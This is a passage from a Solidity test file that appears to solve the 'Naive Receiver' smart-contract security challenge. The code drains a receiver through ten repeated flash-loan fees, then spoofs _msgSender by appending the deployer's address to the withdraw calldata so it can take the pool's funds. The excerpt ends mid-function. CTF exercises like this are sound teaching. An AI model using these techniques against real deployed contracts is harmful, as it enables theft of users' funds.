...
contract NaiveReceiverChallenge is Test {
    ...
    function test_naiveReceiver() public checkSolvedByPlayer {
        // step 1: fixed fee transfer to drain receiver via flashloan fees
        bytes[] memory calls = new bytes[](11);

        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeCall(
                pool.flashLoan, (IERC3156FlashBorrower(address(receiver)), address(weth), 1 ether, bytes(""))
            );
        }

        // step 2: withdraw pool balance by spoofing _msgSender in calldata
        bytes memory withdrawCall =
            abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery)));
        withdrawCall = bytes.concat(withdrawCall, bytes20(deployer)); // last 20 bytes read as _msgSender
